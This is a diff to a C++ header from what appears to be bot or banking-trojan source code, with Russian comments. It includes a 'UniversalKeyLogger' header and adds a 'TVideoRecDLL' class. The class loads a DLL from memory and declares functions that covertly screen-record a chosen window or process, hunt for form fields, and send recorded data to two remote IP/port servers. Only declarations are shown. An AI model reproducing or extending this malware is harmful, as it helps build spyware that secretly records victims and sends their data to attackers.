@@ -4,6 +4,7 @@
 
 #include <windows.h>
 #include "UniversalKeyLogger.h"
+#include "DllLoader.h"
 
 
 // Настройки парметров для билдера
@@ -20,6 +21,44 @@
 
 // порт сервера приёма видео
 const DWORD VIDEORECORD_DEFAULT_PORT = 700;
+
+
+
+//****************************************************
+//  TVideoRecDLL - класс для работы с библиотекой
+//                 видеозаписи
+//****************************************************
+class TVideoRecDLL : public TBotObject
+{
+private:
+	// определяем типы функци1
+	typedef VOID (WINAPI *TStartRecHwnd	)( char* uid, char* nameVideo, HWND wnd,  const char* ip1, int port1, const char* ip2, int port2, int seconds ) ;
+	typedef VOID (WINAPI *TStartRecPid  )( char* uid, char* nameVideo, DWORD pid, const char* ip1, int port1, const char* ip2, int port2, int seconds );
+	typedef VOID (WINAPI *TStopRec		)();
+	typedef VOID (WINAPI *TResetTimer	)();
+
+	typedef VOID (WINAPI *TStartSend	)( char* uid, char* path, const char* ip1, int port1, const char* ip2, int port2 );
+	typedef VOID (WINAPI *TStartFindFields)();
+	typedef VOID (WINAPI *TStopFindFields)();
+	//
+	TStartRecHwnd     FRecordWnd;
+	TStartRecPid      FRecordProcess;
+	TStopRec          FStop;
+	TResetTimer       FResetTimer;
+	TStartSend        FSendData;
+	TStartFindFields  FStartFindFields;
+	TStopFindFields   FStopFindFields;
+	//
+	HMEMORYMODULE FHandle;
+
+	void InitializeApi();
+	void LoadFunc(LPVOID *Addr, const char* Name);
+public:
+	TVideoRecDLL();
+	~TVideoRecDLL();
+};
+
+
 
 
 
